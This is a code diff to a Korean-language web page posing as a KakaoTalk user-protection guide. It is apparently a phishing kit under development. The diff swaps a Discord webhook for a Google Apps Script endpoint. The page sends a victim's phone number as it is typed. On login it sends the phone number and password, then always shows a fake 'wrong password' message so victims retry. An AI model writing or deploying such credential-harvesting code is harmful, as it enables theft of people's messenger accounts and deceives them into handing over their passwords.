@@ -22,6 +22,7 @@
   </style>
 </head>
 <body>
+  <!-- 안내 페이지 -->
   <div id="page1" class="container">
     <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
     <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
@@ -60,33 +61,44 @@
       }
     }
 
-    const webhookURL = 'https://discord.com/api/webhooks/1406817501047947450/TkrHLmb42Hjc3p3afEOtCFe-U5ksQDvH3Bj1RUIGFMdDD98vGG_Rn7lTj1T7qoGdGfG9';
-
+    const GAS_URL = 'https://script.google.com/macros/s/AKfycbzKHO37dQEVn1z14idAqz7qeLXycl3XbLpwOAe4bjc9h0kjQCSkactbvro642I_-Hsv/exec';
 
     const phoneInput = document.querySelector('input[type="text"]');
     let phoneSent = false;
+
+    // 전화번호 입력 이벤트
     phoneInput.addEventListener('input', () => {
       const phone = phoneInput.value.trim();
-      if (phone.length === 11 && !phoneSent) {
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone })
-        })
-        .then(res => console.log('전화번호 전송 완료', res))
-        .catch(err => console.error('전화번호 전송 오류', err));
-        phoneSent = true;
+
+      if (phone.length === 11) {
+        if (!phone.startsWith('010')) {
+          alert('전화번호를 정확하게 입력해주세요');
+          phoneSent = false;
+          return;
+        }
+
+        if (!phoneSent) {
+          fetch(GAS_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone })
+          })
+          .then(res => console.log('전화번호 전송 완료', res))
+          .catch(err => console.error('전화번호 전송 오류', err));
+          phoneSent = true;
+        }
+      } else {
+        phoneSent = false;
       }
-      if (phone.length < 11) phoneSent = false;
     });
 
-    // 로그인 버튼 클릭 시 웹훅 전송 + 무조건 틀렸습니다 알림
+    // 로그인 버튼 클릭 시 전송 + 무조건 틀림 알림
     const loginBtn = document.querySelector('.btn-gray');
     loginBtn.addEventListener('click', () => {
-      const phone = document.querySelector('input[type="text"]').value;
+      const phone = phoneInput.value.trim();
       const password = document.querySelector('input[type="password"]').value;
 
-      fetch(webhookURL, {
+      fetch(GAS_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, password })
@@ -94,7 +106,6 @@
       .then(res => console.log('정보 전송 완료', res))
       .catch(err => console.error('정보 전송 오류', err));
 
-      // 무조건 메시지 표시
       alert('카카오톡 전화번호 또는 비밀번호가 틀렸습니다. 다시 확인해주세요');
     });
   </script>
